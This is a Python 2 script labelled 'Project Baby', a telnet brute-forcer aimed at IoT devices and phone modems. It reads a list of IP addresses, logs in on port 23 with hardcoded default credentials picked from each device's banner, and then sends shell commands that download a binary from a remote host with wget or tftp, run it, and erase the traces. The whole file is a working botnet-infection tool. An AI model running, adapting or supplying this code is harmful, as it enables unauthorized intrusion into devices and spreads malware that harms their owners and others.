#!/usr/bin/python



#----------------------------------------------------------#
"""
  _____           _           _     ____        _           
 |  __ \         (_)         | |   |  _ \      | |          
 | |__) | __ ___  _  ___  ___| |_  | |_) | __ _| |__  _   _ 
 |  ___/ '__/ _ \| |/ _ \/ __| __| |  _ < / _` | '_ \| | | |
 | |   | | | (_) | |  __/ (__| |_  | |_) | (_| | |_) | |_| |
 |_|   |_|  \___/| |\___|\___|\__| |____/ \__,_|_.__/ \__, |
                _/ |                                   __/ |
               |__/                                   |___/ 
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

   "Project Baby" is a telnet list bruteforcer.
   - - - - - - - - - - - - - - - - - - - - -
      - - - - - - Output - - - - - - -
	  python project_baby.py 500 ssh.txt
	- - - - - - - - - - - - - - - - - - - - -
	"list.txt" should be stated like below;
	           69.13.37.69
	           73.28.93.29
	           118.88.29.10
	           199.288.38.28
  - - - - - - - - - - - - - - - - - - - - - - - -
            - - - Credits - - -
			
"""
#----------------------------------------------------------#



import threading, sys, time, random, socket, re, os
from Queue import *
from sys import stdout

if len(sys.argv) < 3:
        print "Usage: python "+sys.argv[0]+" <threads> <list>"
        sys.exit()

usernames = ["root", "admin", "root", "root"] #DONT CHANGE
passwords = ["oelinux123", "admin", "Zte521", "vizxv"] #DONT CHANGE


url = "http://1.3.3.7/bins.sh" # ARM4 Binary
sh_file = "http://1.3.3.7/bins.sh" #Execution file

spawn_shell = "cat | sh"
threads = int(sys.argv[1])
ips = open(sys.argv[2], "r").readlines()
ports = ["23"]
queue = Queue()
qcount = 0
binary = url.split("/")
binary = binary[3]
ip = binary[2]
found = 0
count = 0

for ip in ips:
	qcount += 1
	stdout.write("\r[%d] Loaded" % qcount)
	stdout.flush()
	queue.put(ip)
print "\n"

def readUntil(tn, string, timeout=10):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.01)
        if string in buf: return buf
    raise Exception('TIMEOUT!')

def worker():
	try:
		while True:
			try:
				if queue.empty() == True:
					sys.exit(1)
				ip = queue.get()
				tt = ttelnet(ip)
				tt.start()
				queue.task_done()
			except:
				pass
	except:
		pass

class ttelnet(threading.Thread):
		def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
		def run(self):
			try:
				tn = socket.socket()
				tn.settimeout(5)
				tn.connect((self.ip,23))
				time.sleep(0.2)
				hoho = ''
				hoho += readUntil(tn, ":")
				if "mdm9625" in hoho:
					r00t = 0
					username = usernames[1]
					password = passwords[1]
					tn.send(username + "\n")
				elif "9615-cdp" in hoho:
					r00t = 1
					username = usernames[0]
					password = passwords[0]
					tn.send(username + "\n")
				elif "ogin" in hoho and "9615-cdp" not in hoho:
					zte = 1
					username = usernames[2]
					password = passwords[2]
					tn.send(username + "\n")
				elif "ogin" in hoho and "mdm9625" not in hoho:
					zte = 1
					username = usernames[2]
					password = passwords[2]
					tn.send(username + "\n")
				if "(none)" in hoho:
					zte = 0
					vizxv = 1
					username = usernames[3]
					password = passwords[3]
					tn.send(username + "\n")
				if "BCM" in hoho:
					zte = 0
					vizxv = 0
					BCM = 1
					username = usernames[1]
					password = passwords[1]
					tn.send(username + "\n")
			except Exception:
				tn.close()
			try:
				hoho = ''
				hoho += readUntil(tn, ":")
				if "assword" in hoho:
					tn.send(password + "\n")
					time.sleep(3)
			except Exception:
				tn.close()
			try:
				mp = ''
				mp += tn.recv(1024)
				if "#" in mp or "$" in mp or "~" in mp or ">" in mp or "root@" in mp: # !DO NOT CHANGE ANYTHING! #
					if r00t: tn.send("cd /tmp; wget "+url+" -O telnet; chmod 777 telnet; ./telnet; rm -rf telnet" + "\n"); print "\033[32m[Telnet] command sent %s!\033[37m"%(self.ip); time.sleep(8); tn.close()
					if not r00t: tn.send("su" + "\n"); readUntil(tn, "Password:"); tn.send(passwords[0] + "\n"); time.sleep(1); tn.send("cd /tmp; wget "+url+" -O telnet; chmod 777 telnet; ./telnet; rm -rf telnet" + "\n"); print "\033[32m[PHONE] command sent %s!\033[37m"%(self.ip); time.sleep(8); tn.close()
					if zte: tn.send("cd /var/; rm -rf busybox filename; wget "+url+" -O filename ; cp /bin/busybox ./; busybox cat filename > busybox;./busybox ;rm -rf busybox filename" + "\n"); print "\033[32m[ZTE] command sent %s!\033[37m"%(self.ip); time.sleep(8); tn.close()
					if vizxv: tn.send("cd /var/ || cd /tmp/ || cd /; tftp -r "+binary+" -g "+ip+"; chmod 777 "+binary+"; ./"+binary+"; rm -rf "+binary+""); print "\033[32m[VIZXV] command sent %s!\033[37m"%(self.ip); time.sleep(8); tn.close()
					if BCM: tn.send(spawn_shell + "\n"); time.sleep(1); tn.send("cd /tmp; wget "+sh_file+" -O l.sh; sh l.sh; rm -rf /tmp/*" + "\n"); print "\033[32m[BCM] command sent %s!\033[37m"%(self.ip); time.sleep(8); tn.close()
			except Exception:
				tn.close()
				pass

for g in xrange(threads):
	t = threading.Thread(target=worker)
	t.setDaemon(True)
	t.start()
	
queue.join()
print "Finished!"
